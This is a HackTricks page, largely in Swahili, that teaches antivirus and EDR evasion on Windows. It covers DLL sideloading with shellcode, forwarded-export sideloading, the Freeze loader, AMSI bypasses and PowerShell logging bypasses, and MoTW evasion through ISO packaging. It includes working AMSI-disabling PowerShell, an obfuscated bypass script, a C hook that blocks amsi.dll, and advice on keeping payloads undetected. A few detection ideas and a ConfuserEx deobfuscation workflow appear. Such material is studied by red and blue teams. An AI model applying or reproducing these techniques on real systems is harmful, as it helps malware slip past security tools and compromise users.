# Kuepuka Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zima Defender

- [defendnot](https://github.com/es3n1n/defendnot): Chombo cha kusimamisha Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Chombo cha kusimamisha Windows Defender kufanya kazi kwa kudanganya AV nyingine.
- [Zima Defender ikiwa wewe ni admin](basic-powershell-for-pentesters/README.md)

## **Mbinu za Kuepuka AV**

Kwa sasa, AVs hutumia njia tofauti za kukagua ikiwa faili ni hatari au la: static detection, dynamic analysis, na kwa EDRs zilizo juu zaidi, behavioural analysis.

### **Static detection**

Static detection inafikiwa kwa kuweka alama strings au arrays of bytes zinazojulikana kuwa hatari ndani ya binary au script, na pia kwa kutoa taarifa kutoka kwa faili yenyewe (mf. file description, company name, digital signatures, icon, checksum, n.k.). Hii inamaanisha kuwa kutumia public tools zinazojulikana kunaweza kukuletea kugunduliwa kwa urahisi zaidi, kwani huenda zimechambuliwa na kuwekwa alama kuwa hatari. Kuna njia chache za kuepuka aina hii ya detection:

- **Encryption**

Ikiwa utaencrypt binary, haitakuwa na njia kwa AV kugundua programu yako, lakini utahitaji loader fulani ili kupatanisha (decrypt) na kuendesha programu kwenye memory.

- **Obfuscation**

Wakati mwingine kinachotakiwa ni kubadilisha baadhi ya strings kwenye binary au script yako ili ipite AV, lakini hii inaweza kuwa kazi inayoendelea na kuchukua muda kulingana na kile unachojaribu ku-obfuscate.

- **Custom tooling**

Ikiwa utatengeneza zana zako mwenyewe, haitakuwa na signatures mbaya zinazojulikana, lakini hii inachukua muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kukagua dhidi ya static detection ya Windows Defender ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kwa msingi, inagawa faili katika sehemu nyingi kisha inaagiza Defender iscan kila sehemu moja moja; kwa njia hii, inaweza kukuambia hasa ni strings au bytes gani zilizo na alama ndani ya binary yako.

Ninapendekeza sana uangalie hii [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis ni pale AV inapokimbisha binary yako ndani ya sandbox na kuangalia shughuli hatarishi (mf. kujaribu kupatanisha na kusoma passwords za browser yako, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini kuna baadhi ya mambo unaweza kuyafanya ili kuepuka sandboxes.

- **Sleep before execution** Kulingana na jinsi imekotekwa, inaweza kuwa njia nzuri ya kuepuka dynamic analysis ya AV. AVs zina muda mfupi wa kuscan faili ili zisivurugie kazi za mtumiaji, kwa hivyo kutumia sleeps za muda mrefu kunaweza kuvuruga uchambuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza kuruka sleep hii kulingana na utekelezaji.
- **Checking machine's resources** Kawaida Sandboxes zina rasilimali ndogo za kufanya kazi nazo (mf. < 2GB RAM), vinginevyo zinaweza kupunguza kasi ya mashine ya mtumiaji. Unaweza pia kuwa mmbunifu hapa, kwa mfano kwa kukagua joto la CPU au hata kasi za fan, si kila kitu kitatekelezwa ndani ya sandbox.
- **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imejiunga na domain "contoso.local", unaweza kuangalia domain ya kompyuta kuona kama inalingana na ile uliyotaja; ikiwa haitalingani, unaweza kufanya programu yako itoke.

Inaonekana kuwa Sandbox ya Microsoft Defender ina computername HAL9TH, hivyo, unaweza kuangalia jina la kompyuta kwenye malware yako kabla ya detonation; ikiwa jina linalingana na HAL9TH, inamaanisha uko ndani ya sandbox ya defender, basi unaweza kufanya programu yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Mambo mengine mazuri kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) juu ya kukabiliana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali kwenye post hii, **public tools** hatimaye zitagunduliwa, kwa hivyo, unapaswa kuuliza swali:

Kwa mfano, ikiwa unataka dump LSASS, **je, kweli unahitaji kutumia mimikatz**? Au unaweza kutumia mradi tofauti ambao haujulikani sana na pia unaweza kufanya dump ya LSASS?

Jibu sahihi labda ni hili la mwisho. Kuchukua mimikatz kama mfano, pengine ni mojawapo, ikiwa sio ile inayopatwa zaidi na AVs na EDRs, mradi huo kwa ujumla ni mzuri sana, lakini pia ni shida kubwa kuifanya ipite AVs, kwa hivyo tafuta mbadala kwa kile unachojaribu kufanikisha.

> [!TIP]
> Unapobadilisha payloads zako kwa ajili ya evasion, hakikisha **uzima automatic sample submission** ndani ya defender, na tafadhali, kwa msaada, **USIPAKIE VIRUSTOTAL** ikiwa lengo lako ni kufanikiwa kuepuka kwa muda mrefu. Ikiwa unataka kuangalia kama payload yako inagunduliwa na AV maalum, install yake kwenye VM, jaribu kuzima automatic sample submission, na iteste huko hadi utakapokuwa na matokeo unayoyataka.

## EXEs vs DLLs

Iwapo inawezekana, daima **pendelea kutumia DLLs kwa evasion**, kwa uzoefu wangu, faili za DLL mara nyingi huwa **zinagunduliwa kidogo zaidi** na kuchambuliwa, hivyo ni mbinu rahisi sana ya kuepuka utambuzi katika baadhi ya kesi (ikiwa payload yako ina njia ya kuendesha kama DLL bila shaka).

Kama tunaweza kuona kwenye picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 katika antiscan.me, wakati EXE payload ina detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha baadhi ya mbinu unaweza kutumia na faili za DLL kuwa na utata zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** inatumia mvutano wa DLL search order unaotumika na loader kwa kuweka programu ya mwathiriwa na payload(za) haribifu pembeni kwa kila mmoja.

Unaweza kukagua programu zinazoweza kuwa rahisi kwa DLL Sideloading kutumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itatoa orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL zinazojaribu kupakia.

Ninapendekeza kwa nguvu utafute mwenyewe **DLL Hijackable/Sideloadable programs**, mbinu hii ni ya kimya ikiwa itafanywa vizuri, lakini ikiwa utatumia DLL Sideloadable programs zilizojulikana kwa umma, unaweza kukamatwa kwa urahisi.

Kwa kuweka tu DLL hatari yenye jina ambalo programu inatarajia kupakia, haitapakia payload yako, kwani programu inatarajia baadhi ya kazi maalum ndani ya DLL hiyo; kutatua tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** inapeleka simu ambazo programu inazofanya kutoka kwa proxy (na DLL hatari) kwenda DLL ya asili, hivyo kuhifadhi utendaji wa programu na kuwa na uwezo wa kushughulikia utekelezaji wa payload yako.

Nitakuwa nikitumia mradi [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ni hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupa mafaili 2: DLL source code template, na DLL asilia iliyopewa jina jipya.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ninapendekeza sana uangalie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu yale tunayojadili kwa undani zaidi.

### Kutumia Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Itapakia `TargetDll` ikiwa haijapakiwa
- Itatatua `TargetFunc` kutoka kwake

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, inatolewa kutoka kwa protected KnownDLLs namespace (mfano, ntdll, kernelbase, ole32).
- Ikiwa `TargetDll` si KnownDLL, utaratibu wa kawaida wa utafutaji wa DLL unatumiwa, ambao unajumuisha directory ya module inayofanya forward resolution.

Hii inaruhusu primitive isiyokuwa ya moja kwa moja ya sideloading: tafuta signed DLL ambayo inatoa function iliyopelekwa kwa jina la module lisilo la KnownDLL, kisha iweke DLL hiyo iliyosainiwa pamoja na attacker-controlled DLL iliyopewa jina hasa kama module ya target iliyopeleka. Wakati forwarded export inapotumika, loader itatatua forward na itapakia DLL yako kutoka directory ileile, ikitekeleza DllMain yako.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` si KnownDLL, hivyo hutatuliwa kwa mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili DLL ya mfumo iliyosainiwa hadi folda inayoweza kuandikwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` yenye madhara katika folda ile ile. DllMain ndogo tu inatosha kupata code execution; huna haja ya kutekeleza forwarded function ili kuchochea DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Chochea forward kwa LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) inapakia side-by-side `keyiso.dll` (signed)
- Wakati inabainisha `KeyIsoSetAuditingInterface`, loader inafuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader inapakia `NCRYPTPROV.dll` kutoka `C:\test` na inatekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haitekelezwi, utapata kosa la "missing API" tu baada ya `DllMain` kuwa imekwisha kutekelezwa

Hunting tips:
- Lenga forwarded exports ambapo module lengwa sio KnownDLL. KnownDLLs zimetajwa ndani ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Angalia orodha ya forwarder ya Windows 11 kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Fuatilia LOLBins (mfano, rundll32.exe) zinapakia DLL zilizosainiwa kutoka kwenye njia zisizo za mfumo, ikifuatiwa na kupakia non-KnownDLLs zenye jina la msingi sawa kutoka kwenye saraka hiyo
- Toa tahadhari kwa mnyororo wa mchakato/moduli kama: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` ikiwa chini ya njia zinazoweza kuandikwa na mtumiaji
- Tekeleza sera za uadilifu wa msimbo (WDAC/AppLocker) na kata ruhusa za kuandika+kutekeleza katika saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia fiche.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya; kile kinachofanya kazi leo kinaweza kugunduliwa kesho, hivyo usitegemee zana moja pekee; ikiwa inawezekana, jaribu kuunganisha mbinu mbalimbali za evasion.

## AMSI (Anti-Malware Scan Interface)

AMSI ilunduliwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzo, AV zilikuwa zinaweza tu kufanya scanning ya **files on disk**, hivyo ikiwa ungeweza kwa namna fulani kutekeleza payloads **directly in-memory**, AV haingeweza kuchukua hatua za kuzuia, kwa sababu haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeingizwa katika sehemu hizi za Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Hii inaiwezesha antivirus kuchunguza tabia za script kwa kuonyesha yaliyomo ya script kwa namna isiyoencrypted na isiyefichwa.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` itatoa onyo lifuatalo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Tambua jinsi inavyoweka `amsi:` mwanzoni kisha njia ya executable kutoka ambako script ilikimbia, katika kesi hii, powershell.exe

Hatukuweka faili yoyote kwenye disk, lakini bado tulikamatwa in-memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, C# code inakimbizwa kupitia AMSI pia. Hii inaathiri hata `Assembly.Load(byte[])` kwa ajili ya utendaji in-memory. Ndiyo sababu inashauriwa kutumia toleo za chini za .NET (kama 4.7.2 au chini) kwa utendaji in-memory ikiwa unataka kuepuka AMSI.

Kuna njia chache za kupitisha AMSI:

- **Obfuscation**

Kwa kuwa AMSI hasa inafanya kazi na static detections, hivyo kurekebisha scripts unazojaribu kuingia inaweza kuwa njia nzuri ya kuepuka detection.

Hata hivyo, AMSI ina uwezo wa kuunobfuscate scripts hata kama zimewekwa tabaka nyingi, hivyo obfuscation inaweza kuwa chaguo mbaya kulingana na jinsi inavyofanywa. Hii inafanya iwe si rahisi kuepuka. Ingawa, wakati mwingine, yote unayohitaji ni kubadilisha majina ya baadhi ya variables na utafanikiwa, hivyo inategemea ni kwa kiasi gani kitu kimepokelewa kama tishio.

- **AMSI Bypass**

Kwa kuwa AMSI inatekelezwa kwa kupeleka DLL ndani ya process ya powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuibadilika kwa urahisi hata ukiwa mtumiaji bila vipaumbele. Kutokana na hitilafu hii katika utekelezaji wa AMSI, watafiti wamegundua njia mbalimbali za kuepuka AMSI scanning.

**Forcing an Error**

Kulazimisha AMSI initialization kushindwa (amsiInitFailed) kutasababisha hakuna scan itakayozinduliwa kwa process ya sasa. Awali hili lilifunuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda signature ili kuzuia matumizi mapana.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Ilichukua mstari mmoja tu wa msimbo wa powershell ili kufanya AMSI isitumike kwa mchakato wa powershell wa sasa. Mstari huu kwa kawaida umebainishwa na AMSI yenyewe, hivyo mabadiliko yanahitajika ili kutumia mbinu hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyoichukua kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Kumbuka, hii pengine itaonekana mara chapisho hili litakapotoka, kwa hivyo usichapishe code ikiwa mpango wako ni kubaki bila kugunduliwa.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI inanzishwa tu baada ya `amsi.dll` kupakiwa katika mchakato uliopo. Njia thabiti, isiyotegemea lugha, ya kuepuka ni kuweka user‑mode hook kwenye `ntdll!LdrLoadDll` ambayo inarejesha kosa wakati module iliyohitajika ni `amsi.dll`. Kwa matokeo, AMSI haitapakiwa na hakuna skani zitakazofanyika kwa mchakato huo.

Muhtasari wa utekelezaji (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Vidokezo
- Inafanya kazi kwa PowerShell, WScript/CScript na custom loaders vilevile (chochote kingetumia AMSI).
- Tumia pamoja na kupeleka script kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka artefakti ndefu za mstari wa amri.
- Imeonekana ikitumiwa na loaders zinazotekelezwa kupitia LOLBins (mfano, `regsvr32` inayoitisha `DllRegisterServer`).

Zana hii [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) pia inatengeneza script za bypass AMSI.

**Ondoa saini iliyogunduliwa**

Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa saini ya AMSI iliyogunduliwa kutoka kwenye kumbukumbu ya process ya sasa. Zana hii inafanya kazi kwa kuchambua kumbukumbu ya process ya sasa kutafuta saini ya AMSI na kisha kuibadilisha kwa maagizo ya NOP, kwa ufanisi kuiondoa kwenye kumbukumbu.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia PowerShell toleo la 2**
Iwapo utatumia PowerShell toleo la 2, AMSI haitapakiwa, hivyo unaweza kuendesha script zako bila kutazamwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni kipengele kinachokuruhusu kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hili linaweza kuwa muhimu kwa ukaguzi na utatuzi wa matatizo, lakini pia linaweza kuwa **tatizo kwa wanavunja sheria wanaotaka kuepuka kugunduliwa**.

To bypass PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa kusudi hili.
- **Use Powershell version 2**: Ikiwa utatumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kukaguliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuanzisha powershell bila defenses (hii ndicho `powerpick` kutoka Cobal Strike hutumia).


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation zinategemea kusimba data, ambayo itapandisha entropy ya binary na kufanya iwe rahisi kwa AVs na EDRs kuibaini. Kuwa mwangalifu na hili na pengine tumia encryption tu kwa sehemu maalum za code yako ambazo ni nyeti au zinahitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware inayotumia ConfuserEx 2 (au forks za kibiashara) mara nyingi unakutana na tabaka kadhaa za ulinzi zitakazozuia decompilers na sandboxes. Workflow ifuatayo inarejesha kwa kuaminika **IL inayokaribia asili** ambayo baadaye inaweza kuondolewa hadi C# kwa zana kama dnSpy au ILSpy.

1.  Anti-tampering removal – ConfuserEx inasimba kila *method body* na kuisimbua ndani ya *module* static constructor (`<Module>.cctor`). Hii pia hubadili PE checksum hivyo mabadiliko yoyote yatakulazimisha binary kuanguka. Tumia **AntiTamperKiller** ili kupata jedwali za metadata zilizosasishwa, urejeshe XOR keys na kuandika upya assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output ina parameta 6 za anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambazo zinaweza kuwa muhimu wakati wa kujenga unpacker yako mwenyewe.

2.  Symbol / control-flow recovery – lowesha faili *safi* kwa **de4dot-cex** (fork ya de4dot inayojua ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – chagua profile ya ConfuserEx 2
• de4dot itafuta control-flow flattening, kurejesha namespaces, classes na majina ya variables ya asili na kusimbua strings zilizo konstanti.

3.  Proxy-call stripping – ConfuserEx inabadilisha mwito wa moja kwa moja wa method kuwa wrappers nyepesi (a.k.a *proxy calls*) ili kuvitengenezea zaidi decompilation. Ziondoe kwa **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii utapaswa kuona API za kawaida za .NET kama `Convert.FromBase64String` au `AES.Create()` badala ya functions za wrapper zisizoeleweka (`Class8.smethod_10`, …).

4.  Manual clean-up – endesha binary iliyopatikana chini ya dnSpy, tafuta blobs kubwa za Base64 au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kutambua payload ya *kweli*. Mara nyingi malware huhifadhi kama array ya byte iliyoencoded kwa TLV iliyowekwa ndani ya `<Module>.byte_0`.

Mnyororo hapo juu unarejesha mtiririko wa utekelezaji **bila** hitaji la kuendesha sample yenye madhara – muhimu wakati unafanya kazi kwenye workstation isiyo na mtandao.

> 🛈  ConfuserEx hutengeneza attribute maalum inayoitwa `ConfusedByAttribute` ambayo inaweza kutumika kama IOC kwa kuandaa sampuli moja kwa moja.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya suite ya [LLVM](http://www.llvm.org/) ya compilation inayoweza kuongeza usalama wa programu kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuzalisha, wakati wa compilation, obfuscated code bila kutumia zana za nje na bila kubadilisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Inauongeza safu ya obfuscated operations zinazozalishwa na C++ template metaprogramming framework ambayo itafanya maisha ya mtu anayetaka crack application kuwa magumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza obfuscate aina mbalimbali za pe files ikijumuisha: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni metamorphic code engine rahisi kwa executables yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa LLVM-supported languages ikitumia ROP (return-oriented programming). ROPfuscator inafanya obfuscation ya programu kwenye assembly code level kwa kubadilisha maelekezo ya kawaida kuwa ROP chains, ikizuia mtazamo wetu wa kawaida wa control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter imeandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor ina uwezo wa kubadilisha EXE/DLL zilizopo kuwa shellcode kisha kuzileta ndani

## SmartScreen & MoTW

Huenda umewahi kuona screen hii unapopakua baadhi ya executables kutoka intaneti na kuziendesha.

Microsoft Defender SmartScreen ni mfumo wa usalama uliokusudiwa kulinda mtumiaji wa mwisho dhidi ya kuendesha applications zinazoweza kuwa malicious.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hasa inafanya kazi kwa njia ya kutegemea sifa (reputation-based), ikimaanisha kwamba programu ambazo hazipakuliwi mara kwa mara zitasababisha SmartScreen kutoa onyo na kuzuia mtumiaji ku-execute faili (hata hivyo faili inaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina Zone.Identifier ambayo huundwa moja kwa moja pale unapopakua faili kutoka intaneti, pamoja na URL ilipotolewa.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS kwa faili iliyopakuliwa kutoka intaneti.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizosainiwa na cheti cha kusaini **imeaminika** hazitachochea SmartScreen.

Njia yenye ufanisi kuzuia payloads zako kupata Mark of The Web ni kuwapakisha ndani ya container kama ISO. Hii inatokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayoweka payloads ndani ya output containers ili kuepuka Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

